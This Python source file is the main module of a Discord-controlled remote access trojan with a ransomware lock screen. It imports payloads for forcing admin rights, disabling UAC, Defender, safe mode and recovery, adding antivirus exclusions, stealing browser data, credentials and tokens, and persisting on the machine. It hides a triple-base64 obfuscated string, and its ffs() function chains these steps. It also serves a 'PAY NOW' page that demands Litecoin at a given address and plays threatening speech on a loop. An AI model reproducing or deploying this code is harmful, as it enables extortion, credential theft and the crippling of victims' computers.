import discord
from start.launch import *
import threading
from discord import Embed
import requests
import sys
import os
import pyautogui
from random import randint
import asyncio
import pyttsx3
try:engine=pyttsx3.init()
except:engine=None
from gevent.pywsgi import WSGIServer
import pyperclip
from discord.ext import commands as YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw
from threading import Thread
import base64 as FJIURFIUJIUJFUJFF
from start.launch import run
from payloads.recovery import recon, recoff
from commands.nuke import nofilespls
from commands.browser import search, openurl
from commands.gdi import invcol
from commands.recovery import reagentc
from commands.intermediates import forkbomb, setvol, share_file, ezip, fetchlink
from commands.fun import alert, cb, taskmanagerset
from commands.filenav import cd_command
from commands.others import takepic, mouse_control, taskbar, admin, sysinfo, rotate, defend, sites
from commands.user import manageuser
from commands.basics import clean, clear, bsod, close, processes, fileretrieval, sharenote, speak, pc, startupapps, cmd, kp, wallpaper, endpc
from commands.help import nodubs, helpcommand
from start.noez import noez
from base64 import b64decode as GJIFGIUJEUIJFUIJFSS
import builtins
from payloads.addtopath import pathadd, starttup, ss
from payloads.adminforce import forceadmin
from payloads.browserinfo import getinfo
from payloads.creds import credmgr
from payloads.defender import yesdefend, nodefend
from payloads.exclusions import excludeme
from payloads.firefoxinfo import firefoxing
from payloads.getsysinfo import SYSINFO
from payloads.gettoken import GETTOKEN
from payloads.noovm import novm
from payloads.otherstuff import disable_safe_mode, fuckname, nopower, nogpt, pers, nosettings
from payloads.persistence import neverstop
from payloads.runreg import noreg, yesreg
from payloads.setcmd import nocmd, yescmd
from payloads.setuptasks import setup_tasks
from payloads.siteblocking import blocksites
from payloads.tmset import yestask, notask
from payloads.uac import no_uac, yesuac 
from payloads.unkill import unkiller
from notoken887.encryptor import TokenCryptor
c=TokenCryptor()
from start.zipf import zip
import time
from bs4 import BeautifulSoup as bs4
from flask import Flask
app = Flask(__name__)
def start_server():
    http_server = WSGIServer(("0.0.0.0", 80), app)
    http_server.serve_forever()
ggs=base64.b64decode(base64.b64decode(base64.b64decode("""VkZaU1RtVnJOVlZTVkVaUFVrVnJNRlJXVW1wTlJURkZXbnBXVDFKRmEzZFVNVVYxVWpGd1ZsbFhSbXRNYWtsMFZESXhWVTVyUmxkbFYxWXlaREI0U1dGdFJsbGtiR00xVFhwSk5HVkZlRzlUUjNoR1RXc3hORmRFVW1sV1YyaFc=""")))
@app.route('/')
def index():
    return home()    
def home():
    return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PAY NOW</title>
    <style>
        body {
            background: url('https://www.iec.ch/system/files/styles/original_image/private/2023-04/hacker-6138007_640_1.jpg?itok=qQAbsKYA') no-repeat center center fixed;
            background-size: cover;
            font-family: 'Arial', sans-serif;
            color: #f8f8f8;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            text-align: center;
            max-width: 700px;
            width: 100%;
            padding: 40px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8);
        }
        h1 {
            font-size: 48px;
            color: red;
            font-weight: bold;
            margin: 0;
            text-shadow: 0 0 20px rgba(255, 0, 0, 1), 0 0 30px rgba(255, 0, 0, 1);
        }
        p {
            font-size: 18px;
            color: #f8f8f8;
            margin-top: 30px;
        }
        .button {
            font-size: 20px;
            color: yellow;
            margin: 10px 0;
            padding: 15px;
            width: 80%;
            background-color: #333333;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .button:hover {
            background-color: #444444;
        }
        .bottom-text {
            font-size: 18px;
            color: white;
            margin-top: 20px;
            font-weight: bold;
        }
        .notification {
            margin-top: 20px;
            color: lime;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>PAY NOW</h1>
        <p>HELLO, IF YOU ARE WONDERING WHAT THIS IS, YOU HAVE BEEN HACKED VIA A RANSOMWARE ATTACK</p>
        <p>JUST FOLLOW THE INSTRUCTIONS HERE AND WE WILL KINDLY REMOVE IT</p>
        <p>IF NOT, WE WILL UNINSTALL WINDOWS!!!</p>
        <button class="button" onclick="redirectToCoinbase()">Pay Here</button>
        <button class="button" onclick="copyToClipboard()">LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB</button>
        <p class="bottom-text">Make sure to deposit, not buy directly with a card!</p>
        <p class="notification" id="notification"></p>
    </div>
    <script>
        function copyToClipboard() {
            const cryptoAddress = 'LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB';
            navigator.clipboard.writeText(cryptoAddress).then(() => {
                document.getElementById('notification').textContent = 'LTC Address Copied!';
            });
        }

        function redirectToCoinbase() {
            window.open('https://www.coinbase.com', '_blank');
        }

        function speak(text) {
            const utterance = new SpeechSynthesisUtterance(text);
            utterance.rate = 1.5;
            utterance.pitch = 0.2;
            speechSynthesis.speak(utterance);
        }

        setInterval(() => {
            speak('Your PC has been locked with MILITARY GRADE RANSOMWARE. Your entire operating system is being held hostage. If you restart your PC, it will not remove it. If you do not pay us 100 U.S. dollars worth of Litecoin to the address shown in front of you, we will destroy your computer beyond repair. Once you have paid, we will kindly remove the software. We are also watching you in real time and have full control over your system. If you try and kill the virus, it will uninstall Windows. All your files are corrupted with it. GOOD LUCK paying, because we are logging in to every single account you have.');
        }, 1000);

        const titles = ["YOUR PC IS LOCKED!", "SYSTEM LOCKED", "PAY OR LOSE YOUR FILES"];
        let titleIndex = 0;

        setInterval(() => {
            document.title = titles[titleIndex];
            titleIndex = (titleIndex + 1) % titles.length;
        }, 2000);

        document.body.addEventListener('click', (event) => {
            if (!event.target.closest('.button')) {
                document.body.requestFullscreen().catch(() => {});
            }
        });

        window.onbeforeunload = function () {
            return "Are you sure you want to leave? You have unsaved actions!";
        };
    </script>
</body>
</html>
    """    
def ffs():
    forceadmin()
    Thread(target=starttup).start()
    Thread(target=no_uac).start()
    if psutil.Process().name() != "systemservice92.exe":
        unkiller()
    nodubs()
    recoff()          
    Thread(target=nosettings).start( )
    Thread(target=nodefend).start()
    Thread(target=excludeme).start()
    Thread(target=nocmd).start()
    Thread(target=notask).start()
    SYSINFO()
    firefoxing()
    getinfo()
    credmgr() 
    zip()
    Thread(target=disable_safe_mode).start()
    Thread(target=setup_tasks(sys.executable)).start()
    Thread(target=pathadd).start()
    Thread(target=blocksites).start()
    Thread(target=nopower).start()
    Thread(target=noez).start()
    Thread(target=neverstop).start()    
    noreg()
    Thread(target=start_server).start()